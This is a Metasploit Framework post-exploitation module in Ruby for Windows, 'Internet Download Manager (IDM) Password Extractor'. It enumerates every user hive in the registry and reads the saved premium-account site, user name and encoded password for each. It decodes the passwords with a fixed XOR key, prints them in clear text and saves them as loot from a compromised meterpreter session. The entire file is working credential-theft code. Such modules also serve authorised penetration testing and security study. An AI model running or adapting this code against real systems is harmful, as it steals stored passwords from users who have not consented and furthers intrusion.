##
# $Id: idm.rb 13512 2011-08-10 17:48:30Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Internet Download Manager (IDM) Password Extractor',
			'Description'   => %q{
					This module recovers the saved premium download account passwords from
				Internet Download Manager (IDM). These passwords are stored in an encoded
				format in the registry. This module traverses through these registry entries
				and decodes them. Thanks to the template code of thelightcosine's CoreFTP
				password module.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'sil3ntdre4m <sil3ntdre4m[at]gmail.com>',
					'SecurityXploded Team <contact[at]securityxploded.com>'
				],
			'Version'       => '$Revision: 13512 $',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
	end

	def run
		creds = Rex::Ui::Text::Table.new(
				'Header'  => 'Internet Downloader Manager Credentials',
				'Ident'   => 1,
				'Columns' =>
				[
					'Site',
					'User',
					'Password'
				]
			)

		registry_enumkeys('HKU').each do |k|
			next unless k.include? "S-1-5-21"
			next if k.include? "_Classes"

			print_status("Looking at Key #{k}")

			begin
				subkeys = registry_enumkeys("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\")
				if subkeys.nil? or subkeys.empty?
					print_status ("IDM not installed for this user.")
					return
				end

				subkeys.each do |site|
					user = registry_getvaldata("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\#{site}", "User")
					epass = registry_getvaldata("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\#{site}", "EncPassword")
					next if epass == nil or epass == ""
					pass = xor(epass)
					print_good("Site: #{site} (User=#{user}, Password=#{pass})")
					creds << [site, user, pass]
				end

				print_status("Storing data...")
				path = store_loot(
					'idm.user.creds',
					'text/plain',
					session,
					creds,
					'idm_user_creds.txt',
					'Internet Download Manager User Credentials'
				)

				print_status("IDM user credentials saved in: #{path}")

			rescue ::Exception => e
				print_error("An error has occured: #{e.to_s}")
			end

		end
	end

	def xor(ciphertext)
		pass = ciphertext.unpack("C*")
		key=15
		for i in 0 .. pass.length-1 do
		pass[i] ^= key
		end
		return pass.pack("C*")
	end

end

